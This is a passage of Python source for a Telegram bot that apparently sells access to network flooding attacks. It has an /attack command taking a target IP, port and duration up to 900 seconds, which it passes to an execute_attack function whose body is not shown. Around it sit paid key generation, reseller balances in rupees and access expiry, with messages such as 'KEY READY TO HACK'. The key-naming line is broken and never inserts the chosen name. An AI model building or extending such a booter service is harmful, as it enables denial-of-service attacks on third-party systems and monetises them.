        message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *UNAUTHORIZED USER DETECTED* 🔒\n>>> *REDEEM A KEY OR CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* 💸\n[\\\-=x\\\-=] *LET’S GET YOU IN\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    if user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) >= expiration_date:
                del users[user_id]
                save_users()
                message = f"[\\\-=x\\\-=] *ACCESS EXPIRED* [\\\-=x\\\-=]\n>>> *YOUR KEY HAS EXPIRED* ⏳\n>>> *REDEEM A NEW KEY OR CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* 💸\n[\\\-=x\\\-=] *LET’S GET YOU BACK IN\\!* [\\\-=x\\\-=] 💾🤓"
                bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
                return
        except ValueError:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID EXPIRATION DATE FORMAT* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            return
    if user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) >= expiration_date:
                del authorized_users[user_id]
                save_authorized_users()
                message = f"[\\\-=x\\\-=] *ACCESS EXPIRED* [\\\-=x\\\-=]\n>>> *YOUR AUTHORIZATION HAS EXPIRED* ⏳\n>>> *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* 💸\n[\\\-=x\\\-=] *LET’S GET YOU BACK IN\\!* [\\\-=x\\\-=] 💾🤓"
                bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
                return
        except ValueError:
            message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID EXPIRATION DATE FORMAT* 🚨\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            return
    command = message.text.split()
    if len(command) != 4:
        message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/attack <ip> <port> <time>` ⚡\n>>> *EXAMPLE*: `/attack 192\\.168\\.1\\.1 80 600`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    target = command[1]
    try:
        port = int(command[2])
        time = int(command[3])
    except ValueError:
        message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *PORT AND TIME MUST BE NUMBERS* 🚨\n>>> *EXAMPLE*: `/attack 192\\.168\\.1\\.1 80 600`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    if time > 900:
        message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *TIME MUST BE LESS THAN 900 SECONDS* ⏳\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    if time <= 0:
        message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *TIME MUST BE GREATER THAN 0* ⏳\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID_{user_id}"
    log_command(user_id, target, port, time)
    record_command_logs(user_id, "attack", target, port, time)
    execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    if message.chat.type != "private":
        message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message_text, parse_mode='MarkdownV2')
        return
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    command = message.text.split()
    if len(command) != 3:
        message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/addreseller <user_id> <balance>` 💰\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID BALANCE AMOUNT* 🚨\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        message = f"[\\\-=x\\\-=] *RESELLER PROTOCOL ACTIVATED* [\\\-=x\\\-=]\n[*] *RESELLER ADDED\\, BHAI\\!* ✅💰\n>>> *RESELLER ID*: `{escape_markdown_v2(reseller_id)}` 💻\n>>> *BALANCE*: `{escape_markdown_v2(initial_balance)}` Rs 🤑\n[\\\-=x\\\-=] *SYSTEM UPDATE COMPLETE\\!* [\\\-=x\\\-=] 🟢✨"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
    else:
        message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *RESELLER {escape_markdown_v2(reseller_id)} ALREADY EXISTS* 🚫\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    if message.chat.type != "private":
        message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message_text, parse_mode='MarkdownV2')
        return
    user_id = str(message.from_user.id)
    command = message.text.split()
    if user_id in admin_id or user_id in resellers:
        if len(command) != 3:
            message = f"[\\\-=x\\\-=] *INVALID SYNTAX DETECTED* [\\\-=x\\\-=]\n>>> *USAGE*: `/genkey <duration> <key_name>` 🔑\n>>> *EXAMPLE*: `/genkey 1d rahul` OR `/genkey 30min rahul`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
            bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
            return
        duration = command[1].lower()
        key_name = command[2]
    else:
        message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN OR RESELLER ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    minutes, hours, days, months = parse_duration(duration)
    if minutes is None and hours is None and days is None and months is None:
        message = f"[\\\-=x\\\-=] *ERROR DETECTED* [\\\-=x\\\-=]\n>>> *INVALID DURATION* 🚨\n>>> *VALID FORMATS*: `30min`\\, `1h`\\, `1d`\\, `1m`\\, `1hours`\\, `1days`\\, `1months`\n[\\\-=x\\\-=] *TRY AGAIN\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    cost_duration = duration
    if minutes > 0:
        cost_duration = "1min"
    elif hours >= 24:
        days = hours // 24
        hours = 0
        duration = f"{days}d"
        cost_duration = duration
    elif days >= 30:
        months = days // 30
        days = 0
        duration = f"{months}m"
        cost_duration = duration
    elif months > 0:
        cost_duration = "1m" if months == 1 else f"{months}m"
    elif days > 0:
        cost_duration = "1d" if days == 1 else f"{days}d"
    elif hours > 0:
        cost_duration = "1h" if hours == 1 else f"{hours}h"
    custom_key = f"Rahul_sadiq\\-key_name"
    device_limit = 1
    user_info = bot.get_chat(user_id)
    generated_by = user_info.username if user_info.username else f"UserID_{user_id}"
    key_data = {
        "duration": duration,
        "device_limit": device_limit,
        "devices": keys.get(custom_key, {}).get("devices", []),
        "blocked": keys.get(custom_key, {}).get("blocked", False),
        "generated_time": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
        "generated_by": generated_by
    }
    keys[custom_key] = key_data
    save_keys()
    for user_id in key_data["devices"]:
        if user_id in users:
            expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
            users[user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
    save_users()
    message = f"[\\\-=x\\\-=] *KEY GENERATION PROTOCOL* [\\\-=x\\\-=]\n[*] *KEY {'UPDATED' if custom_key in keys else 'GENERATED'} SUCCESSFULLY\\, BHAI\\!* ✅🔑\n>>> *KEY*: `{escape_markdown_v2(custom_key)}` 🔓\n>>> *DURATION*: `{escape_markdown_v2(duration)}` ⏱️\n>>> *DEVICE LIMIT*: `{escape_markdown_v2(device_limit)}` 📱\n>>> *GENERATED BY*: @{escape_markdown_v2(generated_by)} 💻\n>>> *GENERATED ON*: `{escape_markdown_v2(key_data['generated_time'])}` 🕒"
    if user_id in resellers:
        cost = KEY_COST.get(cost_duration, 0)
        if cost > 0:
            resellers[user_id] -= cost
            save_resellers(resellers)
            message += f"\n>>> *COST*: `{escape_markdown_v2(cost)}` Rs 💸\n>>> *REMAINING BALANCE*: `{escape_markdown_v2(resellers[user_id])}` Rs 🤑"
    message += f"\n[\\\-=x\\\-=] *KEY READY TO HACK\\!* [\\\-=x\\\-=] 💥😎"
    bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    if message.chat.type != "private":
        message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message_text, parse_mode='MarkdownV2')
        return
    user_id = str(message.from_user.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID_{user_id}"
    access_status = "NO ACCESS"
    expiration = "N/A"
    if user_id in admin_id:
        access_status = "ADMIN ACCESS"
        expiration = "NEVER EXPIRES"
    elif user_id in authorized_users:
        access_status = "AUTHORIZED ACCESS"
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            expiration = expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')
            if datetime.datetime.now(IST) >= expiration_date:
                access_status = "ACCESS EXPIRED"
                expiration = "EXPIRED"
        except ValueError:
            expiration = "ERROR"
    elif user_id in users:
        access_status = "KEY ACCESS"
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            expiration = expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')
            if datetime.datetime.now(IST) >= expiration_date:
                access_status = "ACCESS EXPIRED"
                expiration = "EXPIRED"
        except ValueError:
            expiration = "ERROR"
    message = f"[\\\-=x\\\-=] *USER PROFILE* [\\\-=x\\\-=]\n[*] *YOUR INFO\\, BHAI\\!* 👤✨\n>>> *USERNAME*: @{escape_markdown_v2(username)} 💻\n>>> *USER ID*: `{escape_markdown_v2(user_id)}` 🆔\n>>> *ACCESS STATUS*: `{escape_markdown_v2(access_status)}` 🟢\n>>> *EXPIRATION*: `{escape_markdown_v2(expiration)}` ⏳\n[\\\-=x\\\-=] *KEEP HACKING\\, BHAI\\!* [\\\-=x\\\-=] 💥😎"
    bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    if message.chat.type != "private":
        message_text = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *THIS BOT WORKS ONLY IN DIRECT MESSAGES* 🔒\n>>> *USE IN PRIVATE CHAT\\, BHAI\\!* 🚫\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR SUPPORT* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message_text, parse_mode='MarkdownV2')
        return
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        message = f"[\\\-=x\\\-=] *ACCESS DENIED* [\\\-=x\\\-=]\n>>> *ADMIN ONLY COMMAND* 🔒\n[\\\-=x\\\-=] *CONTACT @Rahul_618 FOR ACCESS\\, BHAI\\!* [\\\-=x\\\-=] 💾🤓"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    if not keys:
        message = f"[\\\-=x\\\-=] *KEY DATABASE* [\\\-=x\\\-=]\n[*] *NO KEYS FOUND\\, BHAI\\!* 📋🚫\n[\\\-=x\\\-=] *GENERATE SOME KEYS\\!* [\\\-=x\\\-=] 🔑😎"
        bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
        return
    key_list = []
    for key, data in keys.items():
        key_info = f">>> *KEY*: `{escape_markdown_v2(key)}` 🔑\n>>> *DURATION*: `{escape_markdown_v2(data['duration'])}` ⏱️\n>>> *DEVICE LIMIT*: `{escape_markdown_v2(data['device_limit'])}` 📱\n>>> *DEVICES*: `{escape_markdown_v2(len(data['devices']))}` 💻\n>>> *BLOCKED*: `{escape_markdown_v2('YES' if data.get('blocked', False) else 'NO')}` 🔒\n>>> *GENERATED BY*: @{escape_markdown_v2(data['generated_by'])} 🧑‍💻\n>>> *GENERATED ON*: `{escape_markdown_v2(data['generated_time'])}` 🕒\n"
        key_list.append(key_info)
    message = f"[\\\-=x\\\-=] *KEY DATABASE* [\\\-=x\\\-=]\n[*] *ALL KEYS LISTED\\, BHAI\\!* 📋✨\n\n{''.join(key_list)}[\\\-=x\\\-=] *KEEP MANAGING\\, BHAI\\!* [\\\-=x\\\-=] 💾😎"
    bot.reply_to(message, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "menu_attack":
        message = f"[\\\-=x\\\-=] *ATTACK PROTOCOL* [\\\-=x\\\-=]\n[*] *READY TO STRIKE\\, BHAI\\!* ⚡💥\n>>> *ENTER COMMAND*: `/attack <ip> <port> <time>`\n>>> *EXAMPLE*: `/attack 192\\.168\\.1\\.1 80 600`\n[\\\-=x\\\-=] *LET’S HACK\\!* [\\\-=x\\\-=] 💻😎"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
    elif call.data == "menu_redeem":
        message = f"[\\\-=x\\\-=] *KEY REDEMPTION* [\\\-=x\\\-=]\n[*] *UNLOCK ACCESS\\, BHAI\\!* 🔑✨\n>>> *ENTER COMMAND*: `/redeem <key_name>`\n>>> *EXAMPLE*: `/redeem Rahul_sadiq\\-rahul`\n[\\\-=x\\\-=] *GET IN THE GAME\\!* [\\\-=x\\\-=] 💾😎"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, message, parse_mode='MarkdownV2', reply_markup=create_main_menu())
    elif call.data == "menu_help":
        help_command(call.message)
    elif call.data == "menu_balance":
        check_balance(call.message)
    elif call.data == "menu_myinfo":
        my_info(call.message)
    elif call.data == "menu_listkeys":
        list_keys(call.message)

# Load data on startup
load_data()

# Start the bot with error handling
try:
    bot.polling()
except Exception as e:
    print(f"Error running bot: {str(e)}")
    with open("bot_error.log", "a") as error_log:
        error_log.write(f"[{datetime.datetime.now(IST)}] Bot crashed: {str(e)}\n")